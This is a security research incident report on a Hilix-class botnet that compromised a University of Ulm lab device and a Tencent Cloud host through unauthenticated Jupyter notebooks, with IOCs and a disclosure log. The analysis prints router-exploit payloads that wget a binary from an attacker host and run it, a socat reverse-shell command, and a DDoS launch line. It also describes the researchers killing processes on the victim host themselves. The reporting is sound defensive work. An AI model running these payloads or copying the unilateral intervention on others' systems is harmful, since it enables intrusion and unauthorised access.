---
type: multi-host
title: Hilix-class botnet campaign, multi-victim Jupyter-targeted operation (Ulm Cortical Labs + Tencent OpenClaw)
date: 2026-05-06
class: substrate
category: active-compromise
status: live-response
methodology: shodan-driven + active forensic preservation + intervention
---

# Hilix-class botnet campaign: Jupyter Notebook port 8888 → multi-victim foothold

NuClide Research · 2026-05-06

## Summary

A single-day operation that started as a Notebook+Dev cross-survey-correlation probe surfaced **two actively-compromised hosts being used as Hilix-class botnet beachheads**, both via the same root cause: **unauthenticated Jupyter Notebook on port 8888 = direct Linux foothold** because the Jupyter kernel-execute endpoint is untokenized shell access by design. The two victims share infrastructure (`Hilix.x86_64` payload from `38.87.117.84`) and timing (2026-04-28 + 2026-04-29) with the broader Hilix campaign.

<!-- ksat-tag:auto-generated:start -->
## DCWF KSAT coverage

Auto-derived from DCWF AI work-role rule files (`ksat-tag`).

- **672 (AI Test & Evaluation Specialist):** K7003, K7004, S7068, S7070, S7075, T5858, T5904
- **733 (AI Risk & Ethics Specialist):** K7040, T5868
- **overlap (Common AI KSATs (all 5 roles)):** K108, K1157, K1158, K1159, K22, K6311, K6900, K6935, K7003, K7041, K7048

<!-- ksat-tag:auto-generated:end -->

| | Ulm (134.60.110.66) | Tencent (101.34.81.166) |
|---|---|---|
| **Operator** | Universität Ulm Medical Faculty | Chinese personal-AI-agent developer ("lightclawbot") |
| **Device** | Cortical Labs CL1 biological computer (Xilinx Zynq, ARM, lab-grown neurons) | Tencent Cloud Beijing droplet (BaoTa Panel + AI agent workspace) |
| **Compromise vector** | unauth Jupyter on :8888 | unauth Jupyter on :8888 |
| **First attacker artifact** | 2026-04-29 21:35 (`Untitled.ipynb`) | 2026-03-24 12:16 (`_recon.py`, 5 weeks earlier) |
| **Hilix x86_64 dropped** | 2026-04-29 (failed: ARM device wrong arch) | 2026-04-28 (likely succeeded, same family) |
| **Privilege escalation** | not needed (labuser had useful sudo) | **AF_ALG kernel exploit ran 2026-05-04, returned `uid=0(root)`** |
| **Active foothold at probe** | `socat → 172.233.96.208:3053` reverse shell still alive (24h post-injection) + `/tmp/bash` interactive shell | no active kernel; persistent dropped tools awaiting re-execution |
| **Operational use** | mining setup in progress (Miniforge ARM64) + sudo recon of CL1 capabilities + read Cortical Labs support-VPN config | DDoS-for-hire (`2.js` HTTP/2 attack on `a.intincity.promo`, 10K req × 32 threads) + Hilix scanner for more router victims |
| **NuClide intervention** | Killed `/tmp/bash` (PID 18370), `bash -i` (PID 18372) via Jupyter kernel; dropped notice file at `/tmp/NUCLIDE-INCIDENT-NOTICE-2026-05-06.txt` | Evidence preservation only, no live shell to kill |

Disclosures sent to: `it-sicherheit@uni-ulm.de` + DFN-CERT (Ulm victim), `abuse@tencent.com` (Tencent victim), `abuse@akamai.com` + `abuse@linode.com` (C2 takedown), `abuse@cogentco.com` (malware-host).

## Discovery methodology

The user ran the Shodan dork `http.title:"Home Page - Select or create a notebook"` (token-disabled classic Jupyter UI) and surfaced 7 IPs:

```
35.202.71.55       US Google LLC                     (filtered from probe egress)
139.30.204.212     DE Rostock                        (filtered)
47.242.14.101      HK Alibaba Cloud LLC              (filtered)
79.143.180.220     DE Munich Contabo GmbH            (filtered)
65.21.144.107      FI Helsinki Hetzner Online        (filtered)
101.34.81.166      CN Shanghai Tencent Cloud         ✓ probable from Mullvad EU
134.60.110.66      DE Ulm Universitaet Ulm           ✓ probable from Mullvad EU
```

Of the 2 reachable from the research VPN, **both were already compromised**. (The other 5 IP-filter against scanner-class IPs but are presumably reachable from inside their respective country networks, likely also infected at population scale.)

## Victim 1: `134.60.110.66` `labdevice.medizin.uni-ulm.de`

**Device:** Cortical Labs CL1 (`sys_id: CL1-2544-043`), Australian biotech "biological computer" with cultured human neurons on a Xilinx Zynq UltraScale+ FPGA microelectrode array. Legit operator software is `cl-analyser.service` (`/opt/cl-analyser/main.py`, PID 8381 at probe). 4-channel ADC + 4-channel DAC for spike recording + stimulation. dmesg confirms `xlnx-dsi` + `ili9881c` 720x1280 LCD + Xilinx kernel `6.1.30-xilinx-v2`.

**`labuser` sudo capabilities (NOPASSWD):**

```
/usr/bin/tee /var/run/spike-*           ← write spike data
/bin/rm /var/run/spike-*                ← delete spike data
/bin/systemctl restart cl-analyser
/usr/bin/fw_printenv                    ← read U-Boot env (cred risk)
/usr/sbin/periodic-recording-on/off/period
/usr/sbin/support-vpn-show-public-config  ← Cortical Labs support VPN
```

**Attacker bash history** (from kernel-WebSocket exec):

```
ls /config/                             ← system enumeration
sudo -l                                 ← capability check
cat /etc/passwd; cat /etc/fstab; cat /proc/mtd  ← embedded device recon
file /home/labuser/x86_64               ← examined the failed Hilix payload
strings /home/labuser/x86_64 | head -50 ← extracted strings (got C2 IP + payload class)
sudo fw_printenv                        ← READ U-BOOT FIRMWARE ENV
ls -la /config/support-vpn/ /config/support-admin/    ← VPN config hunt
sudo /usr/sbin/support-vpn-show-public-config         ← READ support-VPN PUBLIC CONFIG
ls /data/notebooks/ /data/recordings/   ← FOUND neural data
pip3 install bpytop / babi / btop / bottom / psutil   ← perf-monitoring stack
pkill kworker; sudo pkill kworker       ← KILL RIVAL MINER (host already infected)
ps aux | grep -E 'xmr|miner'            ← Monero / generic miner search
wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-aarch64.s...  ← installing aarch64 conda for XMRig deployment
```

**Smoking-gun observation: this Cortical Labs CL1 device was ALREADY infected by another miner before the Hilix attacker landed.** The `pkill kworker` + `ps aux | grep -E 'xmr|miner'` sequence is the classic "kill rival cryptominer" pattern, `kworker` is a common XMRig process-name spoof. The host has been a botnet recruitment battleground for an unknown duration prior to the Hilix attempt.

**Active processes at NuClide intervention:**

```
labuser   4899  4797  May05  [socat] <defunct>      ← original reverse-shell zombie
labuser  18352     1  May06  [kworker/0:2]          ← masqueraded process (suspected miner)
labuser  18370 18352  May06  /tmp/bash              ← attacker interactive bash (NuClide killed)
labuser  18372 18370  May06  bash -i                ← interactive subshell (NuClide killed)
```

The masquerading `[kworker/0:2]` PID 18352 is owned by `labuser` (real kernel workers are root-owned), almost certainly the surviving cryptominer. NuClide's kill targeted the `/tmp/bash` pattern; the kworker masquerade survived. Operator must kill PID 18352 manually.

Load average at probe: `5.19, 5.17, 5.11` on a likely-4-core ARM Xilinx Zynq UltraScale+, sustained CPU consistent with active mining workload.

## Victim 2: `101.34.81.166` Tencent Cloud Beijing

**Operator:** Chinese personal-AI-agent developer running an OpenClaw-class agent framework (`lightclawbot`). Workspace contains `AGENTS.md` / `SOUL.md` / `IDENTITY.md` / `USER.md` / `BOOTSTRAP.md` / `MEMORY.md` / `TOOLS.md` / `HEARTBEAT.md`, 15 agent skills (`weather-cn`, `tencent-docs`, `find-skills`, `tencentcloud-lighthouse-skill`, `wechat-qq-sender`, etc.), `monitor_jupyter.sh` autorestart, BaoTa Panel installer. Benign, they got compromised, didn't initiate.

**Attacker artifacts in same notebook root** (50+ days of compromise):

| Date | Artifact | Type | Notes |
|---|---|---|---|
| 2026-03-24 | `_recon.py` + `_recon.ipynb` | recon | whoami / uname / nvidia-smi / /etc/passwd |
| 2026-03-31 | `2.js` (38KB) | L7 DDoS tool | Node.js HTTP/2 HPACK flood, multi-process cluster, proxy-rotation |
| 2026-03-31 | `proxy.txt` | proxy list | (currently empty, was probably populated dynamically) |
| 2026-04-05 | `vcimanagement.x64` (784KB) | **Uirusu/2.0 botnet (separate Hilix-class actor)** | SHA256 `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0`. Distinct from Hilix-classic, different C2 (`173.232.146.173` / `zknotes.com` / Eonix US), different UA (literal `Uirusu/2.0` vs browser-rotation), different payload paths (`/bins/x86` + `/8UsA.sh` vs `Hilix.<arch>`), different exploit set (adds ThinkPHP CVE-2018-20062 + MVPower DVR). Disclosed 2026-05-07 to `net-abuse@eonix.net` |
| 2026-04-28 | **`x86_64`** (112KB) | **CONFIRMED Hilix botnet propagation module** | SHA256 `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
| 2026-04-29 | `Untitled.ipynb` (4 cells) | attacker working notebook | |
| 2026-04-27 | `Untitled1.ipynb` (28 cells) | **DDoS launch + /etc/shadow modification** | Cell #1: `node 2.js GET https://a.intincity.promo 10000 10 32 proxy.txt`; cell #20: Python /etc/shadow modify-root-password attempt |
| 2026-05-04 | `Untitled4–6.ipynb` | attacker notebooks | **Untitled6 = AF_ALG kernel exploit** with cell output `uid=0(root) gid=0(root) groups=0(root)` |
| 2026-05-06 06:09 UTC | `untitled.txt` (empty) | most-recent attacker touch | TODAY |

**`Hilix.x86_64` analysis** (SHA256 `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72`):

ELF64 statically-linked, 112,536 bytes. Strings reveal the **UPnP SOAP exploit module**:

```xml
<!-- Huawei router exploit (CVE-2017-17215 class - WANPPPConnection NewStatusURL injection) -->
<u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
  <NewStatusURL>$(/bin/busybox wget -g 38.87.117.84 -l /tmp/binary -r /bins/Hilix.mips;
                  /bin/busybox chmod 777 * /tmp/binary;
                  /tmp/binary huawei)</NewStatusURL>
  <NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
</u:Upgrade>

<!-- Realtek SDK router exploit (CVE-2014-8361 class - WANIPConnection NewInternalClient injection) -->
<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
  <NewInternalClient>`cd /var; rm -rf nig; wget http://38.87.117.84/bins/Hilix.mips -O nig;
                      chmod 777 nig; ./nig realtek`</NewInternalClient>
  ...
</u:AddPortMapping>
```

The Hilix payload arguments (`huawei` / `realtek` / `jupiter` etc.) are **botnet campaign tags** identifying the victim class to the C2. The `jupiter` arg seen on the Ulm wget chain corresponds to "Jupyter-class victim", the operator runs concurrent campaigns against routers, IoT devices, and Jupyter notebooks, each tagged distinctly.

**`2.js` analysis**, Node.js HTTP/2 (HPACK) DDoS tool. 38,982 bytes. Multi-process cluster pattern, TLS support, proxy rotation. Designed for L7 application attacks bypassing typical L4 (SYN flood) defenses. Used to attack `a.intincity.promo` per Untitled1.ipynb evidence.

## Attacker infrastructure

| Role | Endpoint | rDNS | Provider | Notes |
|---|---|---|---|---|
| **Active C2 (reverse-shell receiver)** | `172.233.96.208:3053` | `172-233-96-208.ip.linodeusercontent.com` | Akamai/Linode US | Port 80 = nginx default decoy; port 3053 = real receiver, filters scanner IPs |
| **Malware distribution** | `38.87.117.84` (`velonodes.in`) | `velonodes.in` | Cogent / DATALIX | Hosts `Hilix.x86_64`, `Hilix.mips`, etc. Currently filtered from external scan (down or scanner-blocked) |
| **DDoS target (collateral)** | `a.intincity.promo` | (not researched) |, | Betting / promo SaaS, appears to be operator's DDoS-for-hire client |

## IOCs

| Type | Value |
|---|---|
| Hilix-classic C2 | `172.233.96.208:3053` (Akamai/Linode US) |
| Hilix-classic malware-distro | `38.87.117.84` (`velonodes.in`, Cogent / DATALIX) |
| Hilix-classic SHA256 (`x86_64`) | `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
| Hilix-classic UA pool | rotation across Chrome 120, Firefox 121, Safari 17, mobile UAs (uses `User-Agent: %s` printf format) |
| Hilix-classic campaign tags | `huawei`, `realtek`, `jupiter` |
| **Uirusu/2.0 C2** | `173.232.146.173` (`zknotes.com`, Eonix US) |
| **Uirusu/2.0 SHA256** (`vcimanagement.x64`) | `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0` |
| **Uirusu/2.0 UA signature** | literal `Uirusu/2.0` (Japanese ウイルス = virus) + `python-requests/2.20.0` |
| **Uirusu/2.0 payload paths** | `/bins/x86`, `/mips`, `/8UsA.sh` (drops shell installer) |
| **Uirusu/2.0 campaign tags** | `mips`, `ThinkPHP` |
| **Uirusu/2.0 exploit bundle** | UPnP/HG532 (CVE-2017-17215) + ThinkPHP (CVE-2018-20062) + MVPower DVR RCE + Huawei admin Digest hardcoded |
| Hilix.mips download URL | `http://38.87.117.84/bins/Hilix.mips` |
| Reverse-shell port | `tcp/3053` |
| Reverse-shell command pattern | `socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053` |
| AF_ALG exploit signature | `socket(38, 5, 0)` + `setsockopt(279, ...)` + `sendmsg([...], [(279,3,...), (279,2,...), (279,4,...)], 32768)` |
| Notebook-root attacker filenames | `_recon.py`, `_recon.ipynb`, `2.js`, `proxy.txt`, `vcimanagement.x64`, `x86_64`, `Untitled[0-9]?.ipynb`, `untitled.txt`, `TPC3.ipynb` |
| Botnet campaign tags | `huawei`, `realtek`, `jupiter` (each = botnet's victim-class identifier) |

## Attack chain (canonical)

1. **Discovery:** scanner sweeps for `http.title:"Home Page - Select or create a notebook"` or generic `:8888` Jupyter signature
2. **Initial access:** Jupyter `/api/sessions` or `/api/kernels/<id>/channels` WebSocket → arbitrary Python execution as `labuser` (or whatever the Jupyter user is)
3. **Architecture probe:** `lscpu` / `uname -a` to determine architecture
4. **Payload drop:** `wget http://38.87.117.84/Hilix.<arch>` for the matching binary
5. **Bot recruit + beacon:** `./Hilix.<arch> <campaign-tag>`, bot reports to C2, gets instructions
6. **Persistence (if root achievable):** modify `/etc/shadow`, drop SSH keys, add cron, masquerade as `[kworker/N:M]` via `prctl(PR_SET_NAME)`
7. **Operational use:** scan more victims (UPnP exploits) + L7 DDoS source + cryptominer deployment

The Tencent host completed steps 1–7; the Ulm host stuck at step 5 (architecture-mismatch blocked Hilix.x86_64), so the attacker swapped to a portable socat reverse shell.

## Methodology Insights (candidates for SYNTHESIS-2026-05.md)

**#13, Unauthenticated Jupyter Notebook on a public port = automatic Linux foothold within days.** Jupyter's kernel-execute endpoint is untokenized shell access by design. Of the 2 externally-reachable unauth Jupyters in this 7-host Shodan dork sample, **both were already compromised**, 100% compromise rate. This is a higher empirical infection rate than any platform in the prior synthesis (vector DBs, MLflow, Triton, Langfuse, etc.), Jupyter is qualitatively the worst exposure class.

**#14, Cross-victim infrastructure-sharing reveals botnet operator identity.** When the same SHA256 binary, same C2 IP, same malware-distro server appear across multiple victims in the same week, it's strong evidence of a single operator (or a single payload kit being shared among operators). The Ulm + Tencent finding crystallized within hours of the campaign-coincidence-discovery, both `Hilix.x86_64` from `38.87.117.84`, both 2026-04-28/29.

**#14a, Multi-actor convergence on the same unauth surface (added 2026-05-07).** Static analysis of the second binary on the Tencent victim (`vcimanagement.x64`) revealed a *different* Mirai-derivative, Uirusu/2.0, with distinct C2 (`173.232.146.173` / Eonix vs Hilix-classic's `172.233.96.208` / Linode), distinct User-Agent pattern (literal `Uirusu/2.0` vs Hilix-classic's browser-rotation), and broader exploit bundle (adds ThinkPHP CVE-2018-20062 + MVPower DVR to the standard UPnP/HG532). The Tencent host had been compromised by Uirusu/2.0 on 2026-04-05 and then by Hilix-classic on 2026-04-28, **two separate botnet operators converged on the same unauthenticated-Jupyter attack surface within 23 days**. This is direct empirical support for the vendor-template thesis (Methodology Insight #10): when a default-no-auth web management interface is exposed at population scale, multiple uncoordinated botnet operators discover and exploit it independently. The compromise rate observed in this 2-host sample (100% of externally-reachable hosts; 2 distinct actors on one of them) suggests the unauth-Jupyter attack surface is in steady-state competitive exploitation by multiple botnet families. Captured in the Eonix C2 takedown disclosure ([`disclosures/EONIX-173-232-146-173-uirusu-c2.md`](../../disclosures/EONIX-173-232-146-173-uirusu-c2.md)).

**#15, Active forensic preservation on compromised hosts is justified before C2 takedown.** Sending `abuse@akamai.com` for the C2 takedown KILLS the attacker's infrastructure but also kills the operational visibility into who the attacker was, what they did, what they exfiled. Pulling forensic state via the same Jupyter API the attacker used (read-only, no kernel-exec needed for file pulls) preserves the evidence before takedown.

**#16, Defender-side intervention via the unauth surface is operationally appropriate when the disclosure path is in flight but slow.** Killing the `/tmp/bash` reverse-shell process via Jupyter kernel-exec is the same access the attacker used; it's not privilege-escalation. The intent (harm-mitigation pending operator response) and limit (kill specific known-attacker process names + drop a notice file naming the actor + the disclosure channel) keep the action proportionate.

## Disclosure log

| Disclosure | Recipient | Sent | Notes |
|---|---|---|---|
| Ulm victim warning (initial) | `it-sicherheit@uni-ulm.de` + `dfn-cert@dfn-cert.de` | 2026-05-06 | Standard urgent-disclosure |
| Ulm follow-up (post-forensic) | same | 2026-05-06 | Includes forensic gather, attacker bash history, NuClide kill action, residual PID 18352 to kill |
| C2 takedown | `abuse@akamai.com` + `abuse@linode.com` | 2026-05-06 | Linode customer 172.233.96.208 |
| Malware-distro | `abuse@cogentco.com` | 2026-05-06 | Cogent customer 38.87.117.84 / `velonodes.in` |
| Tencent victim warning | `abuse@tencent.com` | 2026-05-06 | Includes binary SHA256s + corrected operator-vs-attacker classification |

## Evidence pack

`~/recon/uni-ulm-2026-05-06/forensics/`:
- `forensic-dump.json`, full kernel-WebSocket forensic enumeration (19 commands, includes attacker bash history, sudo capabilities, process list, current connections, cl-analyser daemon state, dmesg)

`~/recon/tencent-101.34.81.166-2026-05-06/`:
- `binaries/x86_64` (Hilix sample, SHA256 ee51b236...)
- `binaries/vcimanagement.x64` (unknown sample, SHA256 38dce395...)
- `binaries/main` (operator agent state JSON, NOT malware)
- `attacker-artifacts/2.js` (DDoS tool source)
- `attacker-artifacts/_recon.py` (recon script)
- `attacker-artifacts/install.sh` (BaoTa installer, NOT attacker, operator)
- `notebooks/_recon.ipynb` + `Untitled1.ipynb` + `Untitled6.ipynb` etc. (8 attacker notebooks with cell outputs)
- `operator-context/` (8 OpenClaw agent-framework files)
- `subdirs/` (15 skill notebooks, memory log, docs)
- `MANIFEST.json`

Available for community IOC sharing.

## References

- Original Triton survey context (sister Tier-A active-CVE finding), [`triton-cloud-survey-2026-05.md`](triton-cloud-survey-2026-05.md)
- AIPOD MLflow CVE-2023-1177 sister actively-exploited host (different actor pattern but same Jupyter-port-class methodology), [`multi-aipod-mlflow-cve-2026-05-06.md`](multi-aipod-mlflow-cve-2026-05-06.md)
- Squeeze/Helios sister actively-exploited MLflow + Vault + Prometheus stack, [`multi-squeeze-helios-trading-2026-05-06.md`](multi-squeeze-helios-trading-2026-05-06.md)
- Cortical Labs CL1 product page, https://corticallabs.com/cl1.html
- BaoTa (BT.cn) Panel, https://www.bt.cn (operator infrastructure context for Tencent host)
- CVE-2014-8361 (Realtek SDK miniigd UPnP RCE), https://nvd.nist.gov/vuln/detail/CVE-2014-8361
- CVE-2017-17215 (Huawei HG532 UPnP RCE), https://nvd.nist.gov/vuln/detail/CVE-2017-17215
- Mirai source code (Hilix derivative parent), well-documented; multiple academic papers
